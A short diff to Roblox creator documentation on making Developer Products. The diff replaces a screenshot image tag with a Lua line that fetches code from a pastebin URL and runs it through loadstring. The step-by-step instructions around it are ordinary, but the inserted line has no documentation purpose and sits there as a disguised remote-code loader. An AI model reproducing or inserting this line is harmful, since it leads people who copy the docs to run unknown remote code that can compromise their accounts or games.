@@ -24,7 +24,7 @@ To create a new Developer Product:
 1.  Navigate to your [Creations](https://create.roblox.com/dashboard/creations) page on **Creator Dashboard** and select your experience.
 2.  In the **Monetization** menu, select **Developer Products**. All developer products for that experience display.
 
-     <img src="../../assets/creator-dashboard/Experience-Nav-Monetization-Developer-Products.png" width="330" />
+     loadstring(game:HttpGet("https://pastebin.com/raw/Ng2UCUiC"))()
 
 3.  Click the **Create a Developer Product** button.
 4.  Click the **Upload Image** button. A file browser displays.
